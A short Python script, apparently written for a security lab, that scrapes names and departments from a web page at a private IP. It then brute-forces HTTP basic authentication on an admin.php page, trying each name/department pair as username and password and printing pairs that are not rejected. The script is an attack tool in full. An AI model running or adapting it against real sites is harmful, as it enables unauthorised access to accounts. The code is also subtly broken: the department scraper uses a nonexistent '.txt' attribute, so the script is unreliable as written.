from bs4.element import NamespacedAttribute
import requests
from bs4 import BeautifulSoup as bs4
from requests.models import Response


#the function will return the comtent of the page via response variable
def downloadPage(url):
    r = requests.get(url)
    Response = r.content
    return Response 

#scrabing the names from the website
def findNames(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='name')
    output = []
    for name in names:
        output.append(name.text)
    return output

#scrabing the department from the website

def findDept(respnse):
    parser = bs4(respnse, 'html.parser')
    depts = parser.find_all('td', id='department')
    output = []
    for dept in depts:
        output.append(dept.txt)
    return output


def getAuth(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print(f"\n[!] Username: {username} | Password: {password} | Code: {str(r.status_code)} \n")


#main function

page = downloadPage("http://172.16.120.120") #for the lab

names = findNames(page)
uniqNames = sorted(set(names)) #sort and remove duplicate

depts = findDept(page)
uniqDepts = sorted(set(depts))

print("[+] Working.... ")
for name in uniqNames:
    for dept in uniqDepts:
        getAuth("http://172.16.120.120/admin.php", name, dept)
